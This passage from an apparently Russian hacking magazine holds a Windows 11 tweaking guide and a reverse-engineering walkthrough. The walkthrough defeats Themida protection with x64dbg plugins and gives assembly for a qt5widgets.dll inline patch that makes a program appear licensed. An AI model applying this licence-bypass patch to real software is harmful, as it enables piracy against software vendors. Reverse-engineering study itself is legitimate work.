


            Блокировка потенциально нежелательного приложения


КОНТРОЛИРУЕМЫЙ ДОСТУП К ПАПКАМ
Штатный антивирус Windows 11 обладает одной очень важной функцией — он
может контролировать доступ к папкам. Работает это так. Пользователь соз‐
дает список контролируемых («охраняемых» папок). Если какая‑то программа
попытается изменить файлы, находящиеся в этих папках, антивирус заб‐
локирует операцию. Конечно, можно указать, каким программам разрешено
изменять файлы в контролируемых папках. Например, если защищаем папку
с документами и таблицами, целесообразно дать доступ к этим документам
программам Word и Excel.
   Контролируемый доступ к папкам позволит сохранить важные данные,
даже если на компьютер проникнет вирус‑шифровальщик или другая вре‐
доносная программа.
   Настроить контролируемый доступ к папкам можно так:
 1. Открой приложение «Безопасность Windows».
 2. Нажми кнопку «Защита от вирусов и угроз».
 3. Пролистай появившийся экран в самый низ и выбери ссылку «Управление
   защитой от программ‑шантажистов».
 4. Включи параметр «Контролируемый доступ к папкам. Защита включена».
   После этого в случае попытки вируса‑шифровальщика зашифровать твои
   данные или при других не одобренных системой изменениях в файлах ты
   будешь получать уведомление о том, что недопустимые изменения заб‐
   локированы.
 5. По умолчанию защищаются системные папки документов пользователей,
   но при желании можно перейти в раздел «Защищенные папки → Добавить
   защищенную папку» и указать любую другую папку или даже целый диск,
   который необходимо защитить от несанкционированных изменений. Сис‐
   темный диск не нужно добавлять в этот список — по понятным причинам.
 6. Выбери команду «Разрешить работу приложения через контролируемый
   доступ к папкам». Используя кнопку «Добавление разрешенного приложе‐
   ния»,  добавь  приложения,  которым  можно  работать  с  файлами
   из защищенных папок.





     Выбери команду «Управление защитой от программ‑шантажистов»





              Включение контролируемого доступа к папкам





                            Какие папки защищены





                          Добавление приложений


ЗАГРУЗКА ИЗ ОБЛАКА
В Windows 10 May 2020 Update появилась функция «Загрузка из облака».
Однако поскольку многие пользователи так и не получили это обновление, то
все считают, что эта функция присуща только Windows 11.
   Работает загрузка и переустановка системы из облака так: вместо пере‐
установки Windows с помощью файлов из локальной системы Windows самос‐
тоятельно скачает самую актуальную версию ОС и установит ее на компь‐
ютер.
   Функция «Загрузка из облака» позволит сэкономить время на установку
необходимых обновлений. Раньше для этого нужно было создавать отдель‐
ный установочный носитель Windows или обновлять систему до сброса
к заводским настройкам. Другими словами, используя эту опцию, можно
не только переустановить Windows, но и при этом получить самую новую вер‐
сию. Раньше же мы откатывались назад, а затем нам пришлось бы устанав‐
ливать выпущенные обновления, чтобы поддерживать систему в актуальном
состоянии. Новая функция позволяет существенно сэкономить время пере‐
установки Windows.





  Получить доступ к функции «Загрузка из облака» можно через экран
  «Система, Восстановление»

При использовании облачной переустановки имей в виду, что, возможно,
придется обновить некоторые свои программы: может выйти так, что исполь‐
зовалась одна версия Windows, она долго не обновлялась, а при облачной
установке была загружена самая новая версия и некоторые программы
не смогут с ней работать. Их и придется переустанавливать. К таким прог‐
раммам часто относят системное ПО вроде сторонних антивирусов, средств
виртуализации (VMware) и некоторые другие.


ЗАКЛЮЧЕНИЕ
Станет ли Windows 11 такой же популярной, как Windows 7 — сказать слож‐
но... С одной стороны, со временем переход на одиннадцатую или более
новую версию Windows неизбежен. С другой стороны, «десятка» на фоне
«семерки» выглядит как что‑то космическое, и действительно заметен про‐
рыв, чего нельзя сказать, если сравнивать Windows 10 и Windows 11. Более
того, весьма много нововведений Windows 11 появились на самом деле
в последних обновлениях Windows 10. Тем не менее прогресс не стоит
на месте, и lifetime Windows 10 рано или поздно закончится. А значит, сейчас
самое время изучать возможности новой версии популярной ОС от Microsoft.
COVERSTORY





                                                                             Валентин Холмогоров
                                                                                                  valentin@holmogorov.ru


ТВИКИНГ
WINDOWS 11

 НАСТРАИВАЕМ НОВУЮ ВИНДУ
 ДЛЯ КОМФОРТНОЙ РАБОТЫ




В начале октября 2021 года вышла Windows 11. Она стала
эволюцией десятой версии, и ее обновленный интерфейс
(включая новую панель задач и  главное меню) далеко
не всем пришелся по вкусу. Однако всегда остается воз‐
можность поковыряться в настройках, чтобы операционка
стала немного более привычной и удобной в работе.


           WARNING

                        Прежде чем  лезть  в  настройки  винды,  нас‐
                           тоятельно рекомендуем создать точку восстанов‐
                        ления, а еще лучше — полностью забэкапить сис‐
                     темный раздел. Все действия, описанные в этой
                          статье, ты выполняешь на свой страх и риск.
                    Ни автор, ни редакция не несут никакой ответс‐
                          твенности за возможные последствия.



СОЗДАЕМ РЕЗЕРВНУЮ КОПИЮ
Прежде чем ковыряться в потрохах операционной системы, имеет смысл
как минимум создать резервную копию системного реестра и точку восста‐
новления. Начнем с последней.


Точка восстановления
В новой винде методика создания точки восстановления не столь тривиаль‐
на, как в предыдущих версиях ОС: никогда не найдешь, если не знаешь, где
искать. Нажми Win + R и в открывшемся окне «Выполнить» набери sysdm.cpl.
Откроется окно «Свойства системы»: перейди к вкладке «Защита системы»,
выдели системный диск и нажми на кнопку «Создать». Введи название
для новой точки восстановления и нажми «ОK».





               Создание точки восстановления в Windows 11

Впоследствии можно будет автоматизировать создание точек восстанов‐
ления с помощью утилиты WMIC.EXE такой командой:


Wmic.exe /Namespace:\\root\default Path SystemRestore Call
CreateRestorePoint "%DATE%", 100, 1

Можно поместить эту команду в batch-файл и запускать вручную от имени
администратора по необходимости либо прописать в планировщике задач
Windows и выполнять по расписанию.


Системный реестр
С реестром все немного проще: для работы с ним существует консольная
утилита REG EXPORT, с помощью которой можно экспортировать целые ветви
реестра, например так:


reg export HKLM С:\hklm.reg

Здесь hklm.reg — файл, в котором будет сохранено содержимое ветви
HKLM. Аналогичным образом можно забэкапить остальные ветви реестра,
а потом, если возникнут проблемы, откатить изменения, запустив reg-файл.





                  Создание бэкапа системного реестра

Пользователь с правами администратора в Windows 11 имеет практически
полный доступ ко всем ветвям реестра, поэтому, если ты обладаешь в сис‐
теме учеткой админа, можешь смело выполнять все требуемые операции
с помощью regedit. Если же админских привилегий у тебя нет, следует запус‐
кать regedit и reg-файлы от имени администратора.


ВОЗВРАЩАЕМ ПРИВЫЧНУЮ ПАНЕЛЬ ЗАДАЧ И ГЛАВНОЕ МЕНЮ
Новая панель задач в стиле macOS пришлась по вкусу многим пользователям
Windows, но далеко не всем. Можно переместить значки приложений и кнопку
«Пуск» в левую часть панели задач, как это было реализовано в «десятке».
Для этого щелкни правой клавишей мыши в любой свободной от значков точ‐
ке панели и в открывшемся контекстном меню выбери пункт «Параметры
панели задач». В открывшемся окне разверни список «Поведение панели
задач» и в расположенном справа меню выбери пункт «Слева».





           Возвращаем значки панели задач на привычное место

Но этого для кого‑то может оказаться недостаточно: и расположение знач‐
ков, и группировка задач в Windows 11 реализованы немного по‑другому.
Самый простой способ вернуться к классическому представлению панели
задач  без  необходимости  устанавливать  дополнительные  программы,
занимающие память, — воспользоваться reg-файлом следующего содер‐
жания:


Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell\
Update\Packages]
"UndockingDisabled"=dword:00000001

После  применения  этого  твика  нужно  перезапустить Windows  Explorer
или завершить текущий сеанс Windows и залогиниться снова. Панель задач
примет более привычный вид, но при этом в ней «сломаются» некоторые
фичи вроде группировки приложений, кроме того, отвалится меню «Пуск»
и строка поиска. Главное меню можно будет вернуть с помощью одной
из бесплатных утилит, речь о которых пойдет дальше, а поиск все еще будет
работать в проводнике.





             Панель задач Windows 11 после применения твика

Чтобы включить и отключить системные значки в панели задач, открой коман‐
дную строку (cmd.exe) и выполни в ней следующую команду:


Explorer shell:::{05d7b0f4-2121-4eff-bf6b-ed3f69b894d9}\SystemIcons

Откроется окно «Системные значки», с помощью которого можно настроить
отображение значков в панели задач.





                         Окно «Системные значки»

Чтобы «сделать все как было» и при этом не поломать функциональность
Windows  11, можно воспользоваться бесплатной утилитой ExplorerPatcher,
которая  возвращает панели задач  классический вид образца Windows
10 и при этом не отключает прочие функции системы. Просто скачиваешь
с сайта разработчика и устанавливаешь приложение — вуаля, все работает!
  Для возврата на место классического меню «Пуск» в новых версиях
Windows традиционно использовалась тулза Classic Shell, но в 11-й версии
намного лучше и стабильнее работает аналогичная утилита OpenShell. Уста‐
новка тулзы полностью идентична Classic Shell, настраивается и работает она
в точности так же.





                Windows 11 c ExplorerPatcher и OpenShell

Если тебе нравится обновленная панель задач Windows 11 и ты решил оста‐
вить ее, но хочешь заменить главное меню более привычным, можно вос‐
пользоваться утилитой Start 11 от Stardock — правда, программа эта платная.


ДОПОЛНИТЕЛЬНАЯ НАСТРОЙКА ПАНЕЛИ ЗАДАЧ
Если ты хочешь поковыряться в более глубоких настройках панели задач,
к твоим услугам инструмент под названием 7+ Taskbar Tweaker, который прек‐
расно зарекомендовал себя в винде с 7-й версии и также работает в 11-й,
если в ней активирована классическая панель.





                       7+ Taskbar Tweaker

Утилита имеет русскоязычный интерфейс и потому крайне проста в исполь‐
зовании. С помощью этой тулзы можно настроить панель задач Windows
11 именно так, как это нужно тебе.


ОТКЛЮЧАЕМ КОРТАНУ
Кортана — это не просто встроенный голосовой помощник Windows, она глу‐
боко интегрирована в функцию поиска, систему безопасности и другие архи‐
тектурные элементы системы. Отключить голосового помощника в настройках
системы бывает недостаточно, но можно выполнить следующие команды:


reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v
"AllowCortana" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Experience\
AllowCortana" /v "value" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v
"CortanaEnabled" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v
"CortanaEnabled" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v
"CanCortanaBeEnabled" /t REG_DWORD /d 0 /f

Не забудь перезапустить систему после внесения изменений в реестр. Чтобы
не отключить, а полностью удалить Кортану для текущего пользователя,
запусти PowerShell от имени администратора и выполни следующую команду:


Get-AppxPackage -allusers Microsoft.549981C3F5F10 |
Remove-AppxPackage

То же самое, но для всех пользователей Windows:


Get-AppxPackage -allusers *Microsoft.549981C3F5F10* |
Remove-AppxPackage


ВЫКЛЮЧЕНИЕ «ЛИШНИХ» СЛУЖБ
По умолчанию в Windows 11 работает несколько служб, которые кому‑то
могут быть попросту не нужны. Например, если ты не пользуешься Xbox, мож‐
но   отключить   службы   XboxGipSvc,   XblAuthManager,   XblGameSave
и XboxNetApiSvc. Если ты не используешь мобильные устройства, а Windows
11   установлена  на   стационарном   компьютере,   можно   отключить
SensorService, SensorDataService и SensrSvc. Также можно без особого вреда
для здоровья системы вырубить следующие службы:
 • DPS — служба политики диагностики;
 • RemoteRegistry — служба удаленного управления реестром;
 • TermService — служба терминалов;
 • TrkWks — клиент отслеживания изменившихся связей.

Для отключения лишних служб воспользуйся вкладкой «Службы» диспетчера
задач Windows.





                         Отключение лишних служб


ВКЛЮЧАЕМ АВТОМАТИЧЕСКУЮ ОЧИСТКУ ФАЙЛА ПОДКАЧКИ
Чтобы при выходе из системы Windows автоматически очищала файл под‐
качки, воспользуйся следующей командой:


reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\
Memory Management" /v " ClearPageFileAtShutdown " /t REG_DWORD /d 1 /
f

Это позволит избежать потенциальной утечки данных: ведь в файле подкачки
может  храниться  различная  важная  информация,  включающая  логины
и пароли.


УДАЛЯЕМ ПРЕДУСТАНОВЛЕННЫЕ ПРИЛОЖЕНИЯ
Часть предустановленных в Windows 11 программ можно удалить в панели
управления, но некоторые мини‑приложения и встроенные утилиты в этом
списке не отображаются. Чтобы деинсталлировать все ненужные приложе‐
ния, можно воспользоваться следующим способом.
 1. Щелкни правой клавишей мыши на кнопке «Пуск» Windows 11 и в контекс‐
   тном меню выбери пункт «Терминал Windows (Администратор)».
 2. В    открывшемся    окне    PowerShell   набери    команду   Get-
   AppxPackage|Select Name, PackageFullName. В консоли отобразится
   список всех установленных приложений и их полные имена.





              Список всех установленных приложений Windows 11

 3. Теперь можно удалить любое приложение командой Remove-AppxPackage
   "fullname", где "fullname" — полное имя приложения, полученное
   на предыдущем шаге. Эта команда удаляет приложение для текущего
   пользователя. Чтобы удалить его для всех пользователей, служит команда
   Get-AppxPackage  -allusers  *app*  |  Remove-AppxPackage,  где
   *app* — имя удаляемого приложения.


УДАЛЯЕМ ЗАДАЧИ ТЕЛЕМЕТРИИ
Все знают, что в Windows имеется планировщик заданий, но далеко не каж‐
дому известно, что он в том числе используется для выполнения задач
телеметрии. Если открыть терминал и набрать команду shtasks /query, ты
получишь список всех запланированных в системе задач.





                    Список всех запланированных задач

Задачи телеметрии представлены в следующем списке:
 • \Microsoft\Windows\FileHistory\File History (maintenance mode)
 • \Microsoft\Windows\AppID\SmartScreenSpecific
 • \Microsoft\Windows\Application Experience\AitAgent
 • \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
 • \Microsoft\Windows\Application Experience\ProgramDataUpdater
 • \Microsoft\Windows\Application Experience\StartupAppTask
 • \Microsoft\Windows\Autochk\Proxy
 • \Microsoft\Windows\CloudExperienceHost\CreateObjectTask
 • \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
 • \Microsoft\Windows\Customer Experience Improvement Program\BthSQM
 • \Microsoft\Windows\Customer           Experience          Improvement
   Program\KernelCeipTask
 • \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
 • \Microsoft\Windows\Customer Experience Improvement Program\Uploader
 • \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-
   DiskDiagnosticDataCollector
 • \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-
   DiskDiagnosticResolver
 • \Microsoft\Windows\DiskFootprint\Diagnostics
 • \Microsoft\Windows\FileHistory\File History (maintenance mode)
 • \Microsoft\Windows\Maintenance\WinSAT
 • \Microsoft\Windows\NetTrace\GatherNetworkInfo
 • \Microsoft\Windows\PI\Sqm-Tasks
 • \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem
 • \Microsoft\Windows\Shell\FamilySafetyMonitor
 • \Microsoft\Windows\Shell\FamilySafetyRefresh
 • \Microsoft\Windows\Shell\FamilySafetyUpload
 • \Microsoft\Windows\Windows Error Reporting\QueueReporting

Отключи ненужную задачу командой schtasks /end /tn "task", где task —
соответствующая задача из списка выше.


ПОЛУЧАЕМ ДОСТУП КО ВСЕМ НАСТРОЙКАМ СИСТЕМЫ
Чтобы получить быстрый и удобный доступ ко всем настройкам Windows 11,
создай на рабочем столе новую папку со следующим именем:


НастройкиСистемы.{ED7BA470-8E54-465E-825C-99712043E01C}

Открыв  папку, ты увидишь окно, где собраны все основные  настройки
Windows, даже те, до которых в обычных условиях не так‑то просто добраться.





                Получаем доступ ко всем настройкам системы


ЗАКЛЮЧЕНИЕ
Microsoft Windows 11 — еще очень молодая операционная система, весь
спектр возможностей которой до конца пока не изучен. Тем не менее она
завоевывает все большую популярность у пользователей, а со временем,
когда срок поддержки конкурирующих версий Windows подойдет к концу,
наверняка вытеснит их. Мы выяснили, как настроить интерфейс Windows
11 таким образом, чтобы он был больше похож на привычную нам Windows 10.
В следующий раз поговорим о настройках, которые позволят увеличить быс‐
тродействие новой винды на старых машинах со слабой аппаратной кон‐
фигурацией.
ВЗЛОМ





                                                                  МВК


ФЕМИДА
ДРЕМЛЕТ
КАК РАБОТАЕТ ОБХОД
ЗАЩИТЫ THEMIDA




Themida, или «Фемида», — одна из самых навороченных
защит для софта. Вместе с VMProtect ее относят к настолько
суровым  протекторам, что программисты, которым жаль
денег на честную покупку этих инструментов (а стоят они
недешево), просто имитируют их наличие, что отпугивает
ленивых и неопытных хакеров. Сегодня мы поговорим о том,
как сбросить триал приложения, защищенного настоящей
Themida.


           WARNING

                        Статья написана в исследовательских целях, име‐
                         ет ознакомительный характер и предназначена
                       для   специалистов  по  безопасности.  Автор
                      и редакция не несут ответственности за любой
                        вред, причиненный с применением изложенной
                        информации.  Использование  или  распростра‐
                      нение ПО без лицензии  производителя может
                           преследоваться по закону.


Несмотря на широкую популярность Themida, высокую стоимость взлома и,
соответственно, большое количество мануалов и видеоуроков в сети, они
почти всегда бесполезны. Они в основном описывают снятие старых версий
защиты 1 и 2. Уже третья версия устроена настолько сложнее, что в паблике
нет универсальных инструментов и скриптов для ее взлома или обхода.
И даже на старых версиях всегда находятся какие‑то нюансы, исключающие
возможность универсального однокнопочного решения.
   Поэтому я не буду останавливаться сейчас на «традиционных» способах
обхода «Фемиды», а вместо этого опишу наиболее простой и понятный метод
исследования, взлома и патча одного из защищенных графических приложе‐
ний. Эта программа использует Themida третьей версии, а мы, как обычно,
вооружимся лишь минимальным набором доступных инструментов (x64dbg
и его плагины).
   Нужно  заметить,  что для  обнаружения Themida не  следует  сильно
полагаться на Detect  It Easy. С этим протектором гораздо лучше работают
Nauz File Detector и Exeinfo.





                         Nauz File Detector





                                    Exeinfo

Визуально же на присутствие «Фемиды» в файле как бы намекает наличие
между секциями .idata и .pdata двух секций с непроизносимыми названи‐
ями из восьми случайных символов. Впрочем, в третьей версии разработчики
уже не стесняясь прямо называют секции .themida и .boot. Код гаран‐
тированно зашифрован, упакован и статическому анализу и реверсу не под‐
дается.
   Поэтому  попробуем  загрузить  накрытую Themida  программу  в наш
любимый отладчик x64dbg. Разумеется, все плохо: при старте отладчик про‐
валивается в виртуальную машину, столь страшную на вид, что отбивается
всякая охота с ней разбираться. Хотя в отдельных случаях этого не избе‐
жать — скажем, при привязке конкретной программы к компьютеру или дон‐
глу. В любом случае этот путь непрост и тернист: виртуальная программа
мгновенно палит отладчик, вдобавок она отслеживает тайминг прохождения
отдельных участков своего кода.
  С ходу приаттачиться к уже активному процессу тоже нельзя, разработчики
и это предусмотрели. Попробуем сделать чуть хитрее — возможно, по прош‐
лым  статьям  ты  помнишь  замечательный  антиантиотладочный  плагин
ScyllaHide для x64dbg. В этом плагине специально для ленивых уже подготов‐
лены профили под каждую популярную защиту. Конечно же, подобный про‐
филь там есть и для Themida. Правда, не шибко сильно он нам поможет:
при загрузке программы он не спасает от антиотладчика, однако приатта‐
читься к запущенному приложению уже позволяет.
    Толку, правда, с этого немного: после такого бряка трассировка убивает
программу наповал. Но это уже прогресс — далее по стандартной схеме,
опробованной нами ранее на Enigma, Obsidium и прочих, пробуем сдампить
прерванный процесс при помощи другого специально предназначенного
для этого плагина — Scylla.
   Приложение дампится успешно. Как обычно, надо искать точку входа, и во
многих случаях этого вполне достаточно, однако наш случай непростой. Заг‐
рузив сдампленный файл в IDA, мы обнаруживаем, что наше приложение неп‐
лохо обфусцировано: на большинстве вызовов импортируемых функций (в
частности, на библиотечных вызовах Qt, на котором написана анализируемая
нами программа)  стоят заглушки, ведущие на изрядной длины цепочки
безумного кода подобного вида:


00007FF6F4FA521D | E9 DB2F5F00              | jmp 7FF6F55981FD
00007FF6F4FA5222 | E9 E5E31D00              | jmp 7FF6F518360C
00007FF6F4FA5227 | E9 25064500              | jmp 7FF6F53F5851
00007FF6F4FA522C | E9 375E5900              | jmp 7FF6F553B068
00007FF6F4FA5231 | 73 D5                    | jae 7FF6F4FA5208
00007FF6F4FA5233 | CF                       | iretd
00007FF6F4FA5234 | 0026                     | add byte ptr ds:[rsi],
ah
00007FF6F4FA5236 | 49:89ED                  | mov r13,rbp
...
00007FF6F55981FD | 48:83EC 08               | sub rsp,8
00007FF6F5598201 | E9 E6DB0200              | jmp 7FF6F55C5DEC
...
00007FF6F55C5DEC | 48:83EC 08               | sub rsp,8
00007FF6F55C5DF0 | 48:83EC 08               | sub rsp,8
00007FF6F55C5DF4 | 48:81EC 08000000         | sub rsp,8
00007FF6F55C5DFB | 48:891C24                | mov qword ptr ss:[rsp],
rbx
00007FF6F55C5DFF | 8F0424                   | pop qword ptr ss:[rsp]
00007FF6F55C5E02 | 8F0424                   | pop qword ptr ss:[rsp]
00007FF6F55C5E05 | E9 83000100              | jmp 7FF6F55D5E8D
...

По‑хорошему надо бы  отфильтровать все  адреса  подобного импорта
и написать деобфускатор, но, учитывая их количество, задача выглядит
муторной, а я обещал относительно простой и комфортный путь (насколько
это возможно вообще в случае столь серьезной защиты). Поэтому самое
время приступить к анализу логики программы в процессе ее работы, то есть
изыскать возможность для ее трассировки.
  По счастью, умные люди уже подсуетились и создали для нас чудесный
плагин Themidie, который позволяет беспроблемно трассировать приатта‐
ченный процесс под Themida. Для его использования необходимы последние
версии отладчика x64dbg и плагина ScyllaHide, про которые я писал выше.
Загрузи с GitHub последнюю версию Themidie и извлеки Themidie.dll
и Themidie.dp64 в папку плагинов x64dbg. В итоге там должны обязательно
присутствовать    четыре    файла:    Themidie.dll,    Themidie.dp64,
HookLibraryx64.dll и ScyllaHideX64DBGPlugin.dp64.
   Загружаем x64dbg и с чувством полного удовлетворения обнаруживаем
в подменю  Plugins (Модули) дополнительный пункт  Themidie. В  опциях
ScyllaHide отключаем все, кроме чекбокса Kill Anti-Attach.





                          Настройка плагина Themidie

Запускаем исследуемую программу из подменю Plugins → Themidie → Start.
Если мы все сделали правильно, то должно появиться вот такое окно.





                        Запуск программы в отладчике

Как следует из текста в этом окошке, программа при запуске не загружается
сразу в отладчик (более того, ее и при всем желании принудительно заг‐
рузить не получится — Themida спалит наш отладчик при загрузке даже так).
Однако к запущенной столь хитрым образом программе можно приаттачить‐
ся, после чего спокойно ставить бряки и отлаживать код, не боясь анти‐
отладчика, что нам,  собственно и  требовалось. Теперь, не испытывая
ни малейших препятствий, обнаруживаем в необфусцированной части кода
развилку обхода проверки лицензии:


00007FF630D5C10F                 call    sub_7FF630D5D970
00007FF630D5C114                 mov     rdx, [rax]
00007FF630D5C117                 mov     rcx, rax
00007FF630D5C11A                 call    qword ptr [rdx+8]
00007FF630D5C11D                 test    al, al
00007FF630D5C11F                 jz      loc_7FF630D5CEE4
00007FF630D5C125                 lea     rcx, [rsp+0EA8h+var_810]
00007FF630D5C12D                 call    sub_7FF631797E20
00007FF630D5C132                 xor     bl, bl

Если бы на приложении не было навешено «Фемиды», можно было бы пить
шампанское: делов‑то — поправить пару байтиков условного перехода je.
Но тут начинается самое интересное. Исходный код у нас зашифрован и упа‐
кован, реверсить виртуальную машину Themida, как мы уже успели убедить‐
ся, — вещь достаточно трудоемкая. Причесать и деобфусцировать сдамплен‐
ный чуть раньше код, конечно, чуть легче, но все равно задача выглядит весь‐
ма непростой.
   Самым    легким   вариантом    кажется   использование    лоадера
или инлайн‑патча. Чтобы не кодить лоадер, попробуем второй вариант. Суть
в том, что если нельзя пропатчить код самого защищенного приложения, то
можно попробовать сделать это из какой‑нибудь незащищенной внешней
библиотеки, благо Qt-шных либ рядом с программой валяется в изобилии,
и контроля целостности на них нет. Слегка поковыряв код, обнаруживаем
ближайший  к нашей  развилке  обфусцированный вызов  функции bool
__cdecl QWidget::isVisible(void) библиотеки qt5widgets.dll.


00007FF6EE96BDAE | 49:8BCF                  | mov rcx,r15
00007FF6EE96BDB1 | FF15 B1B75401            | call qword ptr ds:[7
FF6EFEB7568]
00007FF6EE96BDB7 | 84C0                     | test al,al
00007FF6EE96BDB9 | 0F85 EB020000            | jne 7FF6EE96C0AA
00007FF6EE96BDBF | 48:8D8C24 20090000       | lea rcx,qword ptr ss:[
rsp+920]

После прохождения всей последовательности обфусцированного кода вызов
упирается в коротенькую реализацию данной функции внутри qt5widgets.
dll, ее код мы и будем использовать для автопатча основной программы:


mov rax,qword ptr ds:[rcx+28]
mov eax,dword ptr ds:[rax+8]
shr eax,F
and al,1
ret

Следующая сложность заключается в том, что мы не можем так просто взять
и поправить код исполняемого процесса из него же. Значит, надо искать
переменные в секции данных, правка которых дала бы тот же эффект. Итак,
нам надо добиться, чтобы вызов метода


00007FF630D5C11A                 call    qword ptr [rdx+8]

возвращал в AL ненулевое значение. Еще немного покопавшись в отладчике,
превращаем данный метод вот в такую последовательность действий:


mov rcx,qword ptr ds:[7FF6F47F6EF8]
mov rcx,qword ptr ds:[rcx+10]
movzx eax,byte ptr ds:[rcx+A1E]

Это означает, что для того, чтобы программа почувствовала себя лицензион‐
ной,  нужно  установить  по  адресу  [[[7FF6F47F6EF8]+10]+A1E] любое
ненулевое значение байта (например, 1). Алгоритм наших действий таков:
 1. Выполняем  исходный  код  метода  bool   __cdecl   QWidget::
  isVisible(void). Результат в регистре AL, регистр RCX программе уже
   не интересен, его можно использовать в своих целях, что мы и сделаем.
 2. Проверим, из нужного ли места был вызван метод isVisible. Поскольку
   секция кода садится каждый раз на разные адреса, самое простое
   и более‑менее надежное — проверять последние несколько байтов адре‐
   са  (например,  16   бит).  Искомый  адрес  вызова  должен  быть
  ????????????BDB7.
 3. Адрес вызова мы  также  используем для  относительной  адресации
   переменной [7FF6F47F6EF8]. Несложно посчитать, что смещение между
   ее адресом и адресом вызова равно 0x5AAB44C.
 4. На всякий случай проверяем значение этой переменной (на момент
   вызова нашего isVisible она запросто может быть еще не инициали‐
   зирована) и устанавливаем значение [[[7FF6F47F6EF8]+10]+A1E] в 1.

Теперь, когда алгоритм понятен, ищем в коде библиотеки qt5widgets.dll
ближайший пустой кусок достаточной длины и устанавливаем обработчик
isVisible на него. Поправленный и дополненный код isVisible выглядит
так:


00007FFDB8EFF04F | 48:8B41 28               | mov rax,qword ptr ds:[
rcx+28]
00007FFDB8EFF053 | 8B40 08                  | mov eax,dword ptr ds:[
rax+8]
00007FFDB8EFF056 | C1E8 0F                  | shr eax,F
00007FFDB8EFF059 | 24 01                    | and al,1    <- В AL
результат isVisible
00007FFDB8EFF05B | 48:8B0C24                | mov rcx,qword ptr ss:[
rsp] <- Адрес вызова, точнее, возврата
00007FFDB8EFF05F | 81E1 FFFF0000            | and ecx,FFFF <- Берем
от него младшие 16 бит...
00007FFDB8EFF066 | 48:81F9 B7BD0000         | cmp rcx,BDB7 <- И
проверяем их на ????????????BDB7
00007FFDB8EFF06D | 74 01                    | je qt5widgets.
7FFDB8EFF070
00007FFDB8EFF06F | C3                       | ret          <- Если
вызов не оттуда то ничего не делаем и просто возвращаем AL
00007FFDB8EFF070 | 48:8B0C24                | mov rcx,qword ptr ss:[
rsp] <- Адрес вызова, точнее, возврата
00007FFDB8EFF074 | 48:81C1 41B1E805         | add rcx,5E8B141 <- В
rcx адрес [7FF6F47F6EF8]
00007FFDB8EFF07B | 48:8B09                  | mov rcx,qword ptr ds:[
rcx]
00007FFDB8EFF07E | 48:85C9                  | test rcx,rcx
00007FFDB8EFF081 | 74 EC                    | je qt5widgets.
7FFDB8EFF06F <- Если [7FF6F47F6EF8] не инициализирована, то тоже
ничего не делаем
00007FFDB8EFF083 | 48:8B49 10               | mov rcx,qword ptr ds:[
rcx+10]
00007FFDB8EFF087 | C681 1E0A0000 01         | mov byte ptr ds:[rcx+
A1E],1 <- Устанавливаем признак лицензированности и возвращаем AL
00007FFDB8EFF08E | C3                       | ret

Все это кажется каким‑то извращением, но это работает: внешняя стандар‐
тная библиотека Qt при обращении к ней из нужного места делает накрытую
Themida программу «лицензионной», даже не модифицируя ее код.
   Я, конечно, не претендую на чистоту, правильность и надежность при‐
веденного выше кода, но, на мой взгляд, это самый простой и быстрый прин‐
цип автопатча, пригодный для обхода не только Themida, но и любой другой
серьезной защиты, шифрующей код и проверяющей его целостность.
ВЗЛОМ
 СНЫ
  ФЕМИДЫ





       ЛОМАЕМ ВИРТУАЛЬНУЮ
         МАШИНУ THEMIDA





Themida считается одним из самых сложных
инструментов     защиты      программ
от   нелицензионного   копирования —
не только из‑за обфускации и наворочен‐
ных механизмов антиотладки, но и из‑за           МВК
широкого  использования  виртуализации.
В предыдущей статье мы узнали, как сбро‐
сить триал в защищенной Themida прог‐
рамме. Теперь настало время поковырять‐
ся в ее виртуальной машине.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


В прошлых статьях я уже упоминал об одной очень зловредной особенности
серьезных  протекторов:  чтобы осложнить жизнь хакерам,  разработчики
обфусцируют критические участки скомпилированного кода в макрокоманды
виртуальной машины, щедро разбавленные ловушками и безумным кодом.
При таком раскладе объем кода может увеличиваться в тысячи раз, делая
реверс чудовищно сложным. Вдобавок его можно делать мутирующим,
реализуя одну и ту же команду сотнями разных способов. Мы уже стал‐
кивались с подобным в статье про Enigma, теперь попробуем разобрать
более сложный способ виртуализации на примере снятия триала с одного
из графических плагинов.
   Итак, условия задачи: у нас есть 64-битная библиотека, привязанная
к  определенному  ознакомительному  периоду.  Халявный сброс  триала,
методы которого я описывал в предыдущих статьях, невозможен: при заг‐
рузке библиотека стучится на сервер, который проверяет текущую дату и дает
добро на запуск. При отсутствии соединения программа просто не работает.
Код упакован и зашифрован, исследованию в дизассемблере не подлежит,
но детекторы не видят на нем никакого известного протектора. В общем,
ситуация начинает слегка пугать.
  Но мы не из пугливых! Загружаем программу в наш любимый отладчик
x64dbg и при помощи описанного мною в предыдущих статьях замечатель‐
ного  плагина  ScyllaHide  подбираем  антиантиотладочную  конфигурацию
(Themida). Теперь включаем уже опробованный нами в боях плагин Themidie
и наконец получаем возможность поковыряться в расшифрованном и рас‐
пакованном коде (включая его трассировку). Чтобы расшифрованный код
было удобнее изучать, я сдампил его еще одним описанным ранее пла‐
гином — Scylla. Если теперь мы загрузим сдампленный код в дизассемблер
IDA, то увидим примерно такую картину.





                  Cдампленный код в дизассемблере IDA

Бегло взглянув на карту нашего модуля, мы увидим коротенькую синюю
полоску слева. Она подсказывает, что в начале модуля сосредоточен нор‐
мальный вменяемый код функций, который по каким‑то причинам (обычно
